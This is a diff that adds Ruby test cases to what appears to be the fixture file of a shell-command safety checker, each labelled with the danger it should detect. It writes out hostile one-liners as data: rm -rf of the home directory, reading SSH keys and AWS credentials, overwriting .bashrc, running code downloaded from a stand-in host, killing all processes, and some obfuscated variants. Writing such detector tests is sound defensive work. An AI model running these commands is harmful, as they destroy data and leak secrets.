@@ -376,3 +376,44 @@ posix rules=unknown effect=unknown | echo "c(.c(''.(X%'''\\"';c(=" | node
 posix rules=unknown effect=unknown | node <<'EOF'\nc(.c(''.(X%'''"';c(=\nEOF
 posix rules=unknown effect=unknown | node -e "eval('c(.c(\\\\'\\\\'.(X%\\\\'\\\\'\\\\'\\"\\\\';c(=')"
 posix rules=unknown,delete effect=changes | node -e "c(.c(''.(X%'''\\"';c(=" && rm -rf ~
+
+# Ruby given with `-e` or a here-document is read the same way: what it
+# deletes, writes, reads and runs is judged like the same shell command.
+posix safe | ruby -e 'puts 1 + 1'
+posix safe | ruby -e 'x = "a-b"; puts x.split("-").join(",")'
+posix safe | ruby -e 'puts Math.sqrt(2)'
+posix finds=delete reason="deletes your home directory" | ruby -e 'FileUtils.rm_rf(Dir.home)'
+posix finds=delete | ruby -e 'require "fileutils"; FileUtils.rm_rf("/home/me")'
+posix finds=delete | ruby -e 'File.delete("/home/me/.bashrc")'
+posix finds=delete | ruby -e 'Pathname.new("/home/me").rmtree'
+posix finds=delete | ruby -e 'system("rm", "-rf", "/home/me")'
+posix finds=delete | ruby -e '`rm -rf ~`'
+posix finds=delete | ruby -e '%x(rm -rf ~)'
+posix finds=delete | ruby -e 'IO.popen(["rm", "-rf", "/home/me"])'
+posix finds=delete | ruby -e 'Open3.capture2("rm -rf ~")'
+posix finds=delete | ruby -e 'open("|rm -rf ~")'
+posix finds=delete | ruby -e 'Dir.chdir("/home"); FileUtils.rm_rf("me")'
+posix finds=delete | ruby -e 'system("rm -rf me", chdir: "/home")'
+posix finds=delete | ruby -e 'eval("File.delete(\\"/home/me/.bashrc\\")")'
+posix finds=read_secret reason="reads your SSH keys" | ruby -e 'puts File.read(Dir.home + "/.ssh/id_rsa")'
+posix finds=read_secret | ruby -e 'puts File.read(File.join(ENV["HOME"], ".ssh", "id_rsa"))'
+posix finds=read_secret | ruby -e 'puts IO.read("/home/me/.aws/credentials")'
+posix finds=read_secret | ruby -e 'puts File.read("#{Dir.home}/.netrc")'
+posix finds=read_secret | ruby -e 'puts YAML.load_file("/home/me/.ssh/id_rsa")'
+posix finds=overwrite | ruby -e 'File.write("/home/me/.bashrc", "x")'
+posix finds=overwrite | ruby -e 'File.open("/home/me/.zshrc", "a") { |f| f.puts "x" }'
+posix finds=overwrite | ruby -e 'system("ls", out: "/home/me/.bashrc")'
+posix finds=run_downloaded | ruby -e 'system("curl -s https://x.example/x.sh | sh")'
+posix finds=run_downloaded | ruby -e 'eval(Net::HTTP.get(URI("https://x.example/a.rb")))'
+posix finds=stop_system | ruby -e 'Process.kill(:KILL, -1)'
+# A path only known when the code runs is judged as `rm -rf "$x"` is, and
+# a command line only known when it runs is unknown.
+posix finds=delete reason="deletes a path only known when it runs" | ruby -e 'File.delete(ARGV[0])'
+posix finds=unknown | ruby -e 'system(ENV["CMD"])'
+# Ruby that loads code, or calls a method by a name, is not read.
+posix finds=unknown | ruby -e 'require "json"'
+posix finds=unknown | ruby -e 'send(:system, "rm -rf ~")'
+# Ruby reads on past an `__END__` that is not alone on its line.
+posix finds=delete | ruby -e 'puts 1\n__END__ x\nsystem("rm -rf ~")'
+posix finds=overwrite | ruby -e 'File.open("/home/me/.bashrc", flags: File::TRUNC)'
+posix finds=unknown | ruby -e '$LOAD_PATH.unshift("/tmp/x"); require "y"'
